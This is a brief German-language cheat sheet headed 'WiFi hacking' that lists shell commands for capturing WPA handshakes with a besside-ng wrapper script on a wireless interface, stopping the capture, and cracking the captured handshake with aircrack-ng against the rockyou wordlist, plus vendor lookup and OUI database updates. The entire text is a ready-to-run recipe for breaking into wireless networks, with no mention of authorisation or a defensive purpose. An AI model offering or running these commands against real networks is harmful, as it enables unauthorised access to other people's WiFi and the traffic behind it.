WiFi hacking 🛜

WPA-Handshakes aufzeichnen:

sudo ./besside-ng-wrapper.sh -i wlan0 start
tail -f besside.log

Beenden:

sudo ./besside-ng-wrapper.sh -i wlan0mon stop

Versuchen das WLAN-Passwort zu erraten:

./lsvendor <besside.log
aircrack-ng -w /usr/share/wordlists/rockyou.txt ./wpa.cap

OUI Datenbank aktualisieren:

./update-oui

